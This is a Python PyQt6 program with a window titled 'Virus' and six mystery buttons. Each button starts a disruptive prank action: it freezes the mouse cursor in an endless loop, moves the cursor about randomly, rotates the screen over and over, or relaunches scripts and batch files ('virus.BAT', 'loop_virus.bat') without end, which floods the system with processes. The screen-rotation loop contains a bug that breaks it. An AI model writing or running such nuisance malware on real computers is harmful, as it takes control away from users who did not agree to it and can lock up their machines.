from PyQt6.QtWidgets import QApplication, QMainWindow, QLabel, QPushButton, QWidget
from PyQt6.QtGui import QPixmap, QFont
from mouse import get_position, move
import rotatescreen as RS
from PyQt6.QtGui import *
import pyautogui as pag
import random
import time
import sys
import os

class MainWindow(QMainWindow):
    def __init__(self):
        super().__init__()
        self.setGeometry(0, 0, 493, 550)
        self.setWindowIcon(QIcon('channels4_profile (2).jpg'))
        self.centralwidget = QWidget(self)
        titel="Virus"
        self.setWindowTitle(titel)
        self.setStyleSheet("background-color: black;") 
        
        #label
        self.label = QLabel(self.centralwidget)
        self.label.setGeometry(-10, -30, 541, 561)
        self.label.setText("")
        self.label.setPixmap(QPixmap("unnamed.png"))
        
        #lable
        self.button1 = QPushButton(self.centralwidget)
        self.button1.setGeometry(20, 20, 141, 231)
        self.button1.setFont(QFont("Trebuchet MS", 72))
        self.button1.setStyleSheet("background-color: rgb(170, 85, 255);")
        self.button1.setText("?")
        self.button1.clicked.connect(self.muse1)
        
        self.button2 = QPushButton(self.centralwidget)
        self.button2.setGeometry(180, 20, 141, 231)
        self.button2.setFont(QFont("Trebuchet MS", 72))
        self.button2.setStyleSheet("background-color: rgb(170, 85, 255);")
        self.button2.setText("?")
        self.button2.clicked.connect(self.mouse)
        
        self.button3 = QPushButton(self.centralwidget)
        self.button3.setGeometry(330, 20, 141, 231)
        self.button3.setFont(QFont("Trebuchet MS", 72))
        self.button3.setStyleSheet("background-color: rgb(170, 85, 255);")
        self.button3.setText("?")
        self.button3.clicked.connect(self.rotate_screen)
        
        self.button4 = QPushButton(self.centralwidget)
        self.button4.setGeometry(20, 260, 141, 231)
        self.button4.setFont(QFont("Trebuchet MS", 72))
        self.button4.setStyleSheet("background-color: rgb(170, 85, 255);")
        self.button4.setText("?")
        self.button4.clicked.connect(self.Notification)
        
        self.button5 = QPushButton(self.centralwidget)
        self.button5.setGeometry(180, 260, 141, 231)
        self.button5.setFont(QFont("Trebuchet MS", 72))
        self.button5.setStyleSheet("background-color: rgb(170, 85, 255);")
        self.button5.setText("?")
        self.button5.clicked.connect(self.Error)
        
        self.Button6 = QPushButton(self.centralwidget)
        self.Button6.setGeometry(330, 260, 141, 231)
        self.Button6.setFont(QFont("Trebuchet MS", 72))
        self.Button6.setStyleSheet("background-color: rgb(170, 85, 255);")
        self.Button6.setText("?")
        self.Button6.clicked.connect(self.loop_app)
        
        self.setCentralWidget(self.centralwidget)
        
        self.menubar = self.menuBar()
        self.statusbar = self.statusBar()
        
        #defs
        
    def mouse(self):
        position = get_position() 
        x = position[0]
        y = position[1]
        while True:
            move(x, y)
    
    def muse1(self):
        mousemoves = 0
        while mousemoves <= 1000:
            muse_x = random.randint(900, 1500)
            muse_y = random.randint(400, 800)
            pag.moveTo(muse_x, muse_y, 0.2)
            time.sleep(0.01)
            mousemoves += 1
    
    def rotate_screen(self):
        screen = RS.get_primary_display()
        angle_list = [90, 180, 270, 0]
        for i in True:
            for angle in angle_list:
                screen.rotate_to(angle)
                time.sleep(0.3)
                
    def Notification(self):
        while True:
            os.startfile("New Text Document.py")
            time.sleep(0)
    def Error(self):
        while True:
         os.startfile("virus.BAT")
         
    def loop_app(self):
        for i in range(1):
            os.startfile("loop_virus.bat")
    
app = QApplication(sys.argv)
window = MainWindow()
window.show()
sys.exit(app.exec())